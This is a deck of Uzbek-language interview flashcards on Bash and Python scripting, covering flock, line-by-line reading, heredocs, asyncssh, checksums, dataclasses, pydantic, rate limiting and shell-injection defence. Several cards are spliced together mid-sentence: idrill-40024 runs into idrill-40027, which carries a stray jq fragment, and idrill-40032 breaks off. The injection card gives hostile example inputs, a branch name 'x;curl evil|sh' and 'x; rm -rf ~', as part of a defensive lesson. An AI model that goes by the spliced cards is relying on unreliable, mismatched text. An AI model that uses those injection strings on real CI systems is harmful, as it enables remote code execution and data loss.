Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40021	<p>Bash'da <code>flock</code> bilan ishonchli file locking qanday qilinadi?</p>	<p><b>Qisqa javob:</b> <code>flock</code> — kernel darajasidagi advisory lock. Skript lock faylni file descriptor'ga ochadi va <code>flock -n</code> bilan qulflaydi; ikkinchi nusxa lock ololmaydi va chiqadi. Jarayon tugaganda (hatto <code>kill -9</code> da ham) kernel lock'ni avtomatik bo'shatadi.</p><p><b>Muammo:</b> Cron har 5 daqiqada backup ishga tushiradi, lekin backup ba'zan 7 daqiqa davom etadi. Ikki nusxa bir vaqtda bir faylga yozadi — buzilgan backup. PID fayl bilan yondashuv jarayon o'lganda eski PID qolib ketishi (&quot;stale lock&quot;) bilan muammoli.</p><p><b>Qanday ishlaydi:</b></p><pre>nusxa A: exec 200&gt;lock ; flock -n 200 -&gt; OK, ishlayapti<br>nusxa B: exec 200&gt;lock ; flock -n 200 -&gt; band -&gt; rc 1 -&gt; chiqadi<br>nusxa A tugadi/o'ldi -&gt; fd yopildi -&gt; kernel lock'ni bo'shatdi</pre><p><b>Amalda:</b></p><pre>#!/usr/bin/env bash<br>set -euo pipefail<br><br>LOCK_FILE=/var/lock/backup_job.lock<br>exec 200&gt;&quot;$LOCK_FILE&quot;                 # fd 200 butun skript davomida ochiq<br><br>if ! flock -n 200; then<br>  echo &quot;[WARN] boshqa nusxa ishlayapti, chiqildi&quot; &gt;&amp;2<br>  exit 0                              # cron uchun bu xato emas<br>fi<br><br>echo &quot;[INFO] backup boshlandi (pid $$)&quot;<br>/usr/local/bin/do-backup</pre><pre># Bir qatorda, cron'dan to'g'ridan-to'g'ri:<br>*/5 * * * * flock -n /var/lock/backup.lock /usr/local/bin/backup.sh<br><br># Kutib turish (max 30s), keyin taslim<br>flock -w 30 /var/lock/deploy.lock ./deploy.sh<br><br># Kim ushlab turibdi?<br>lslocks | grep backup</pre><p><b>Tuzoqlar:</b></p><ul><li>Lock fd'ni ochib, bola jarayonga meros qoldirsangiz (<code>app &amp;</code>), u ham lock'ni ushlaydi — skript tugasa ham lock qoladi.</li><li>NFS ustida <code>flock</code> ishonchsiz bo'lishi mumkin — lokal FS (<code>/var/lock</code>, <code>/run/lock</code>) ishlating.</li><li>Advisory: <code>flock</code> ishlatmaydigan boshqa dastur faylni baribir o'zgartira oladi.</li><li>Lock faylni skript oxirida <code>rm</code> qilish — race condition; faylni qoldiring.</li></ul><p><b>Senior nuqta:</b> <code>flock</code> faqat bitta host ichida ishlaydi. Bir nechta server yoki K8s replica'lar orasida mutual exclusion kerak bo'lsa — K8s CronJob <code>concurrencyPolicy: Forbid</code>, systemd timer (servis allaqachon ishlayotgan bo'lsa qayta ishga tushirmaydi) yoki distributed lock (etcd lease, Postgres advisory lock).</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40022	<p>Katta faylni Bash'da xotirani tugatmasdan qatorma-qator qanday o'qiysiz?</p>	<p><b>Qisqa javob:</b> <code>while IFS= read -r line; do ...; done &lt; file</code> — faylni bittalab qator o'qiydi, butun faylni xotiraga yuklamaydi. <code>IFS=</code> bosh/oxirgi bo'shliqni saqlaydi, <code>-r</code> backslash'ni buzmaydi, <code>|| [[ -n $line ]]</code> oxirgi newline'siz qatorni ham oladi.</p><p><b>Muammo:</b> <code>for line in $(cat big.log)</code> — butun 10 GB faylni xotiraga oladi, so'zlarga (qatorga emas) bo'ladi va glob'larni ochadi. Natija noto'g'ri va OOM.</p><p><b>Qanday ishlaydi:</b></p><pre>file --(stdin)--&gt; read -r line  (bitta qator, buferlangan)<br>                   |-&gt; tana: $line bilan ish<br>                   '-&gt; keyingi qator ... EOF -&gt; read rc 1 -&gt; sikl tugaydi<br>oxirgi qator &quot;\n&quot; siz: read uni o'qiydi, lekin rc 1 -&gt; &quot;|| [[ -n $line ]]&quot; saqlab qoladi</pre><p><b>Amalda:</b></p><pre># To'g'ri naqsh<br>while IFS= read -r line || [[ -n &quot;$line&quot; ]]; do<br>  [[ -z &quot;$line&quot; || &quot;$line&quot; == \#* ]] &amp;&amp; continue    # bo'sh va izohlarni o'tkaz<br>  printf 'host: %s\n' &quot;$line&quot;<br>done &lt; hosts.txt<br><br># Ustunlarga bo'lib o'qish<br>while IFS=: read -r user _ uid _; do<br>  (( uid &gt;= 1000 )) &amp;&amp; echo &quot;$user&quot;<br>done &lt; /etc/passwd<br><br># Siklichida ssh/ffmpeg kabi stdin o'qiydigan buyruq bo'lsa<br>while IFS= read -r h; do<br>  ssh -n &quot;$h&quot; uptime          # -n: stdin'ni yutib yubormasin<br>done &lt; hosts.txt<br><br># Juda katta fayl uchun tezroq: awk<br>awk '/ERROR/ {n++} END {print n}' big.log</pre><p><b>Tuzoqlar:</b></p><ul><li><code>cat file | while read ...</code> — sikl subshell'da ishlaydi; ichida o'zgartirilgan o'zgaruvchilar sikldan keyin yo'qoladi. <code>done &lt; file</code> yoki <code>&lt; &lt;(cmd)</code> ishlating.</li><li>Sikl ichidagi <code>ssh</code> stdin'ni o'qib, qolgan qatorlarni &quot;yeb qo'yadi&quot; — faqat birinchi host ishlaydi. <code>ssh -n</code> yoki <code>read -u 3 ... 3&lt; file</code>.</li><li>Bash <code>read</code> sikli sekin (har qator uchun syscall'lar) — millionlab qatorda <code>awk</code>/<code>grep</code> 10-100x tez.</li></ul><p><b>Senior nuqta:</b> Bash'da qator-qator sikl — boshqaruv mantiqi uchun (host ro'yxati, kichik config). Ma'lumot qayta ishlash (GB log) uchun <code>awk</code>, <code>grep</code>, yoki Python generator to'g'ri vosita.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40023	<p>Bash'da multiline string/heredoc'ni o'zgaruvchi expansion'siz qanday uzatasiz?</p>	<p><b>Qisqa javob:</b> Heredoc delimiter'ini tirnoqlash (<code>&lt;&lt;'EOF'</code>) ichidagi <code>$VAR</code>, <code>$(cmd)</code> va <code>\</code> ni ochmasdan literal uzatadi. Tirnoqsiz (<code>&lt;&lt;EOF</code>) bo'lsa Bash ularni darhol kengaytiradi.</p><p><b>Muammo:</b> Skript boshqa skript yoki konfig (masalan systemd unit, Nginx <code>$host</code>, masofaviy SSH skript) yaratadi. Tirnoqsiz heredoc <code>$host</code> ni hozirgi shell'dagi bo'sh qiymat bilan almashtiradi — yaratilgan fayl buziladi.</p><p><b>Qanday ishlaydi:</b></p><pre>&lt;&lt;EOF    : $VAR, $(cmd), `cmd`, \ ochiladi (double quote kabi)<br>&lt;&lt;'EOF'  : hech narsa ochilmaydi (single quote kabi)<br>&lt;&lt;-EOF   : boshidagi TAB'larni olib tashlaydi (bo'shliqlarni emas)</pre><p><b>Amalda:</b></p><pre># Literal — generatsiya qilinadigan skript ichida ochilsin<br>cat &lt;&lt;'EOF' &gt; /tmp/report.sh<br>#!/usr/bin/env bash<br>echo &quot;Generated at $(date) for user $USER&quot;<br>EOF<br><br># Aralash: ba'zisi hozir, ba'zisi keyin<br>cat &lt;&lt;EOF &gt; /etc/nginx/conf.d/app.conf<br>server {<br>  server_name ${DOMAIN};             # hozir ochiladi<br>  location / {<br>    proxy_set_header Host \$host;    # literal $host qoladi<br>    proxy_pass http://127.0.0.1:${PORT};<br>  }<br>}<br>EOF<br><br># Masofaviy serverda skript bajarish<br>ssh web1 bash -s &lt;&lt;'EOF'<br>set -e<br>echo &quot;Bu yerda $HOSTNAME masofaviy qiymat&quot;<br>EOF<br><br># O'zgaruvchiga multiline string<br>read -r -d '' SQL &lt;&lt;'EOF' || true<br>SELECT * FROM users WHERE name = '$x';<br>EOF</pre><p><b>Tuzoqlar:</b></p><ul><li>Yopuvchi <code>EOF</code> qator boshida bo'lishi va undan keyin bo'shliq bo'lmasligi kerak — aks holda heredoc tugamaydi.</li><li><code>&lt;&lt;-EOF</code> faqat TAB'ni olib tashlaydi; editor bo'shliqqa almashtirsa ishlamaydi.</li><li><code>read -d ''</code> EOF da 1 qaytaradi — <code>set -e</code> bilan <code>|| true</code> kerak.</li><li>Ko'p <code>\$</code> escape'lar bo'lsa xato oson — <code>envsubst '${DOMAIN} ${PORT}'</code> bilan faqat tanlangan o'zgaruvchilarni almashtirish toza.</li></ul><p><b>Senior nuqta:</b> Murakkab konfig generatsiyasini heredoc'da emas, shablon tizimida (<code>envsubst</code>, Jinja2/Ansible template, Helm) qiling — test qilish va review oson. Heredoc kichik va bir martalik fayllar uchun.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40024	<p>Python <code>asyncio</code> va <code>asyncssh</code> bilan 50 ta serverda bir vaqtda buyruq qanday bajariladi?</p>	<p><b>Qisqa javob:</b> <code>asyncssh</code> + <code>asyncio.gather()</code> bilan har server uchun coroutine yaratiladi; SSH ulanishlar I/O kutayotganda boshqa server bilan ishlanadi, shuning uchun 50 server ~bitta server vaqtida tugaydi. <code>asyncio.Semaphore</code> bilan bir vaqtdagi ulanishlar chegaralanadi, <code>timeout</code> va xato ishlov majburiy.</p><p><b>Muammo:</b> Ketma-ket <code>ssh</code> sikl: 50 server x 3s = 2.5 daqiqa; bitta server qotsa hammasi kutadi. Oddiy <code>gather</code> xatolarni ushlamasa — bitta host xatosi butun natijani yo'qotadi.</p><p><b>Qanday ishlaydi:</b></p><pre>event loop<br>  |-- run_cmd(h1): connect ... await (tarmoq) -&gt; loop boshqasiga o'tadi<br>  |-- run_cmd(h2): connect ... await<br>  |-- ...           (semaphore: max 20 tasi bir vaqtda)<br>  v<br>gather(return_exceptions=True) -&gt; [natija | Exception, ...]</pre><p><b>Amalda:</b></p><pre>import asyncio, asyncssh<br><br>SEM = asyncio.Semaphore(20)<br><br>async def run_cmd(host: str, cmd: str, timeout: float = 15):<br>    async with SEM:<br>        try:<br>            async with asyncssh.connect(host, username=&quot;ubuntu&quot;,<br>                                        connect_timeout=5) as conn:   # known_hosts default ~/.ssh/known_hosts<br>                r = await asyncio.wait_for(conn.run(cmd, check=False), timeout)<br>                return host, r.exit_status, r.stdout.strip()<br>        except (OSError, asyncssh.Error, asyncio.TimeoutError) as e:<br>            return host, -1, f&quot;ERROR: {e}&quot;<br><br>async def main(hosts):<br>    results = await asyncio.gather(*(run_cmd(h, &quot;uptime&quot;) for h in hosts))<br>    for host, rc, out in sorted(results):<br>        print(f&quot;[{host}] rc={rc} {out}&quot;)<br>    return sum(1 for _, rc, _ in results if rc != 0)<br><br>if __name__ == &quot;__main__&quot;:<br>    failed = asyncio.run(main([f&quot;10.0.0.{i}&quot; for i in range(1, 51)]))<br>    raise SystemExit(1 if failed else 0)</pre><p><b>Tuzoqlar:</b></p><ul><li><code>known_hosts=None</code> — host key tekshiruvini o'chiradi, MITM'ga ochiq. Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40027	<p>Nomli flag'lar qabul qiladigan Bash funksiyasini qanday yozasiz?</p>	<p><b>Qisqa javob:</b> Funksiya ichida <code>while [[ $# -gt 0 ]]; do case &quot;$1&quot; in ...</code> sikli bilan argumentlar ketma-ket tekshiriladi; flag qiymatini <code>$2</code> dan olib, <code>shift 2</code> bilan o'tkaziladi. &quot;us-west-2&quot;)<br> printf '%s\n'   -&gt; us-east-1\nus-west-2<br> jq -R .         -&gt; &quot;us-east-1&quot;  &quot;us-west-2&quot;   (har qator = JSON string)<br> jq -s .         -&gt; [&quot;us-east-1&quot;,&quot;us-west-2&quot;]  (slurp: hammasini massivga)</pre><p><b>Amalda:</b></p><pre>REGIONS=(&quot;us-east-1&quot; Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40029	<p>Python'da faylning SHA256 checksum'ini qanday hisoblaysiz?</p>	<p><b>Qisqa javob:</b> <code>hashlib.sha256()</code> obyektini yaratib, faylni binary rejimda (<code>&quot;rb&quot;</code>) bo'laklab (chunk) o'qiysiz va har bo'lakni <code>update()</code> ga berasiz; oxirida <code>hexdigest()</code>. Python 3.11+ da qisqa yo'l: <code>hashlib.file_digest(f, &quot;sha256&quot;)</code>.</p><p><b>Muammo:</b> Yuklab olingan artefakt (binary, image, backup) yo'lda buzilmaganini yoki almashtirilmaganini tekshirish kerak. <code>f.read()</code> bilan butun 10 GB faylni o'qish xotirani tugatadi.</p><p><b>Qanday ishlaydi:</b></p><pre>fayl -&gt; [1 MB] -&gt; sha.update -&gt; [1 MB] -&gt; sha.update -&gt; ... EOF<br>                     ichki holat (256 bit) yangilanadi<br>     -&gt; hexdigest() -&gt; 64 belgili hex string<br>Xotira: chunk hajmi (doimiy), fayl hajmiga bog'liq emas.</pre><p><b>Amalda:</b></p><pre>import hashlib, hmac<br>from pathlib import Path<br><br>def sha256_file(path: str | Path, chunk: int = 1024 * 1024) -&gt; str:<br>    h = hashlib.sha256()<br>    with open(path, &quot;rb&quot;) as f:<br>        while block := f.read(chunk):<br>            h.update(block)<br>    return h.hexdigest()<br><br># Python 3.11+<br>def sha256_file_311(path):<br>    with open(path, &quot;rb&quot;) as f:<br>        return hashlib.file_digest(f, &quot;sha256&quot;).hexdigest()<br><br>expected = Path(&quot;app.tar.gz.sha256&quot;).read_text().split()[0]<br>actual = sha256_file(&quot;app.tar.gz&quot;)<br>if not hmac.compare_digest(actual, expected):<br>    raise SystemExit(f&quot;checksum mos emas: {actual} != {expected}&quot;)<br>print(&quot;OK&quot;)</pre><pre>sha256sum app.tar.gz                  # Bash ekvivalenti<br>sha256sum -c app.tar.gz.sha256        # fayldagi qiymat bilan tekshirish</pre><p><b>Tuzoqlar:</b></p><ul><li><code>&quot;r&quot;</code> (text) rejimda ochish — newline konvertatsiyasi va decode xatosi; doim <code>&quot;rb&quot;</code>.</li><li>MD5/SHA1 integrity uchun eskirgan (collision); SHA-256 yoki undan yuqori.</li><li>Checksum faylni artefakt bilan bir xil manbadan olish — hujumchi ikkalasini almashtirsa himoya yo'q. Checksum'ni imzolang (GPG, cosign).</li></ul><p><b>Senior nuqta:</b> Checksum faqat tasodifiy buzilishdan himoya qiladi; supply chain uchun imzo (Sigstore/cosign, GPG) va provenance (SLSA) kerak. Chunk hajmi 64 KB-1 MB oralig'ida odatda optimal.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting

Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40031	<p>Python <code>dataclass</code> nima va nega infra modellar uchun ishlatiladi?</p>	<p><b>Qisqa javob:</b> <code>@dataclass</code> — sinfga <code>__init__</code>, <code>__repr__</code>, <code>__eq__</code> ni maydonlardan avtomatik yozib beradigan decorator. <code>frozen=True</code> obyektni o'zgarmas (immutable) va hashable qiladi. Infra skriptlarida dict o'rniga aniq tipli model sifatida ishlatiladi.</p><p><b>Muammo:</b> <code>instance[&quot;ip_adress&quot;]</code> — dict'dagi typo faqat runtime'da <code>KeyError</code> beradi, IDE yordam bermaydi, qaysi kalitlar borligi noma'lum. Dataclass maydonlarni hujjatlaydi, <code>mypy</code> va IDE xatoni oldindan topadi.</p><p><b>Qanday ishlaydi:</b></p><pre>@dataclass<br>class Instance: id: str; ip: str; cores: int = 2<br>   -&gt; __init__(self, id, ip, cores=2)<br>   -&gt; __repr__  -&gt; Instance(id='i-1', ip='10.0.0.5', cores=2)<br>   -&gt; __eq__    -&gt; maydonlar bo'yicha solishtirish<br>frozen=True -&gt; __setattr__ xato beradi, __hash__ yaratiladi (set/dict kaliti bo'la oladi)</pre><p><b>Amalda:</b></p><pre>from dataclasses import dataclass, field, asdict<br><br>@dataclass(frozen=True, slots=True)          # slots: kamroq xotira (3.10+)<br>class Instance:<br>    instance_id: str<br>    ip: str<br>    cores: int<br>    tags: tuple[str, ...] = ()<br><br>    @property<br>    def is_large(self) -&gt; bool:<br>        return self.cores &gt;= 8<br><br>def from_aws(d: dict) -&gt; Instance:<br>    return Instance(<br>        instance_id=d[&quot;InstanceId&quot;],<br>        ip=d.get(&quot;PrivateIpAddress&quot;, &quot;&quot;),<br>        cores=d[&quot;CpuOptions&quot;][&quot;CoreCount&quot;],<br>        tags=tuple(t[&quot;Key&quot;] for t in d.get(&quot;Tags&quot;, [])),<br>    )<br><br>i = Instance(&quot;i-123&quot;, &quot;10.0.0.5&quot;, 16)<br>print(i, i.is_large)          # Instance(instance_id='i-123', ...) True<br>print(asdict(i))              # JSON'ga chiqarish uchun dict<br>seen = {i}                    # frozen -&gt; hashable<br># i.cores = 2                 -&gt; FrozenInstanceError<br><br>@dataclass<br>class Report:<br>    items: list[Instance] = field(default_factory=list)   # mutable default shu tarzda</pre><p><b>Tuzoqlar:</b></p><ul><li><code>items: list = []</code> — barcha obyektlar bitta listni bo'lishadi; dataclass buni <code>ValueError</code> bilan taqiqlaydi, <code>field(default_factory=list)</code> ishlating.</li><li>Dataclass tiplarni <b>tekshirmaydi</b> — <code>Instance(&quot;x&quot;, &quot;y&quot;, &quot;16&quot;)</code> jim o'tadi. Validatsiya kerak bo'lsa pydantic.</li><li><code>frozen=True</code> faqat sayoz: ichidagi list baribir o'zgaradi — tuple ishlating.</li></ul><p><b>Senior nuqta:</b> Ichki modellar uchun dataclass (tez, dependency yo'q), tashqi chegaradagi ishonchsiz ma'lumot (API javob, config) uchun pydantic. API javobini chegara qatlamida modelga o'girib, ichkarida faqat model bilan ishlash — kodni barqaror qiladi.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40032	<p>Konfiguratsiyani validatsiya qilishda <code>pydantic</code> nima?</p>	<p><b>Qisqa javob:</b> Pydantic — tip annotatsiyalari asosida ma'lumotni validatsiya va konvertatsiya qiluvchi kutubxona. <code>pydantic-settings</code> dagi <code>BaseSettings</code> konfiguratsiyani env o'zgaruvchilar/<code>.env</code> dan o'qib, tiplarga o'giradi va noto'g'ri bo'lsa ilova <b>startda</b> aniq xabar bilan yiqiladi.</p><p><b>Muammo:</b> <code>DB_PORT=54x2</code> yoki <code>REPLICAS</code> umuman berilmagan — oddiy <code>os.getenv</code> bilan ilova ishga tushadi va xato soatlar o'tib, birinchi so'rovda chiqadi. Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40033	<p>Python'da oddiy rate limiter (token bucket g'oyasi) qanday yoziladi?</p>	<p><b>Qisqa javob:</b> Token bucket: chelakda maksimal <code>capacity</code> token bor, ular <code>rate</code> tezlikda to'ladi; har so'rov bitta token oladi, token bo'lmasa kutadi. Bu o'rtacha tezlikni cheklaydi, lekin <code>capacity</code> gacha burst'ga ruxsat beradi. Vaqt uchun <code>time.monotonic()</code> ishlatiladi.</p><p><b>Muammo:</b> Skript AWS/GitHub API'ga sekundiga 500 so'rov yuboradi va <code>429 Too Many Requests</code> / <code>ThrottlingException</code> oladi yoki akkaunt bloklanadi. O'zingiz tezlikni API limitidan past ushlashingiz kerak.</p><p><b>Qanday ishlaydi:</b></p><pre>capacity=10, rate=5/s<br>t=0   tokens=10  -&gt; 10 so'rov darhol (burst)  -&gt; tokens=0<br>t=0.2 tokens=1   -&gt; 1 so'rov<br>...  doimiy holatda 5 so'rov/s<br>tokens = min(capacity, tokens + (now - last) * rate)</pre><p><b>Amalda:</b></p><pre>import time, threading<br><br>class TokenBucket:<br>    def __init__(self, rate: float, capacity: int):<br>        self.rate = rate<br>        self.capacity = capacity<br>        self.tokens = float(capacity)<br>        self.last = time.monotonic()<br>        self.lock = threading.Lock()<br><br>    def acquire(self) -&gt; None:<br>        while True:<br>            with self.lock:<br>                now = time.monotonic()<br>                self.tokens = min(self.capacity,<br>                                  self.tokens + (now - self.last) * self.rate)<br>                self.last = now<br>                if self.tokens &gt;= 1:<br>                    self.tokens -= 1<br>                    return<br>                wait = (1 - self.tokens) / self.rate<br>            time.sleep(wait)          # lock'dan tashqarida kutish<br><br>bucket = TokenBucket(rate=5, capacity=10)<br>for repo in repos:<br>    bucket.acquire()<br>    call_api(repo)</pre><p>Oddiy variant (burst'siz) — har chaqiruv orasida <code>1/rate</code> minimal interval saqlash; sodda, lekin burst bermaydi.</p><p><b>Tuzoqlar:</b></p><ul><li><code>time.time()</code> — tizim soati orqaga/oldinga sakrashi mumkin (NTP); interval uchun <code>time.monotonic()</code>.</li><li>Lock'siz ko'p thread'da — race condition, limit oshib ketadi.</li><li>Bu faqat bitta jarayon ichida ishlaydi; 10 ta pod har biri 5/s yuborsa jami 50/s.</li></ul><p><b>Senior nuqta:</b> Client-side limiter API'ning server limitini almashtirmaydi — 429 va <code>Retry-After</code> ni baribir hurmat qiling. Ko'p instans uchun umumiy limit kerak bo'lsa Redis asosidagi limiter yoki API gateway darajasida cheklang.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
Interview Drill::Automation & scripting::H1 Bash & Python scripting	idrill-40034	<p>Shell injection'ning oldini olish uchun Bash'da input qanday sanitize qilinadi?</p>	<p><b>Qisqa javob:</b> Input'ni allowlist regex bilan tekshiring (<code>[[ $x =~ ^[a-zA-Z0-9_-]+$ ]]</code>), o'zgaruvchilarni doim qo'shtirnoqda ishlating, <code>eval</code> va <code>bash -c &quot;$input&quot;</code> dan qoching, argumentlarni <code>--</code> bilan ajrating. Shell injection'ning asosiy sababi — ma'lumotning kod sifatida qayta parse qilinishi.</p><p><b>Muammo:</b> CI job branch nomini oladi: <code>git checkout $BRANCH</code>. Hujumchi branch nomini <code>x;curl evil|sh</code> qilsa (yoki <code>eval</code>/<code>ssh &quot;... $BRANCH&quot;</code> orqali) runner'da kod bajariladi. GitHub Actions'da <code>${{ github.event.pull_request.title }}</code> ni <code>run:</code> ichiga to'g'ridan qo'yish — mashhur hujum vektori.</p><p><b>Qanday ishlaydi:</b></p><pre>xavfli:  eval &quot;deploy $NAME&quot;          NAME='x; rm -rf ~'  -&gt; ikki buyruq<br>xavfli:  ssh host &quot;ls $DIR&quot;           masofada qayta parse<br>xavfsiz: deploy &quot;$NAME&quot;               bitta argument, hech qachon kod emas</pre><p><b>Amalda:</b></p><pre>validate_name() {<br>  [[ &quot;$1&quot; =~ ^[a-zA-Z0-9._-]{1,63}$ ]] || { echo &quot;[ERROR] noto'g'ri nom: $1&quot; &gt;&amp;2; exit 2; }<br>}<br>validate_name &quot;$BRANCH&quot;<br><br># Doim tirnoq + &quot;--&quot; (nom &quot;-&quot; bilan boshlansa option bo'lib qolmasin)<br>git checkout -- &quot;$BRANCH&quot;<br>rm -f -- &quot;$FILE&quot;<br><br># Masofaga xavfsiz uzatish: printf %q bilan escape<br>ssh web1 &quot;ls -l $(printf '%q' &quot;$DIR&quot;)&quot;<br><br># Allowlist case bilan<br>case &quot;$ENV&quot; in dev|staging|prod) ;; *) echo &quot;noto'g'ri env&quot; &gt;&amp;2; exit 2 ;; esac<br><br># Fayl yo'li ma'lum papkadan chiqmasin (path traversal)<br>real=$(realpath -m -- &quot;/srv/uploads/$NAME&quot;)<br>[[ $real == /srv/uploads/* ]] || exit 2</pre><p>GitHub Actions'da: <code>env: TITLE: ${{ github.event.pull_request.title }}</code> qilib, <code>run:</code> ichida <code>&quot;$TITLE&quot;</code> ishlating.</p><p><b>Tuzoqlar:</b></p><ul><li>Blocklist (<code>;</code>, <code>|</code> ni olib tashlash) — har doim chetlab o'tiladi (<code>$(...)</code>, backtick, newline). Allowlist ishlating.</li><li><code>[[ $x =~ ... ]]</code> da <code>^</code> va <code>$</code> unutilsa — qisman moslik yetarli bo'lib qoladi.</li><li><code>xargs</code>, <code>find -exec sh -c &quot;...{}...&quot;</code> ham qayta parse qiladi — <code>sh -c '...' _ &quot;$f&quot;</code> shaklida uzating.</li></ul><p><b>Senior nuqta:</b> Eng yaxshi himoya — ishonchsiz input'ni shell'ga umuman bermaslik: Python <code>subprocess.run([...])</code> (shell yo'q) yoki API. CI'da PR'dan kelgan har qanday matn (title, branch, commit message) ishonchsiz deb hisoblanadi.</p>	lvl::Middle dom::auto sec::h1 Bash_Python_scripting
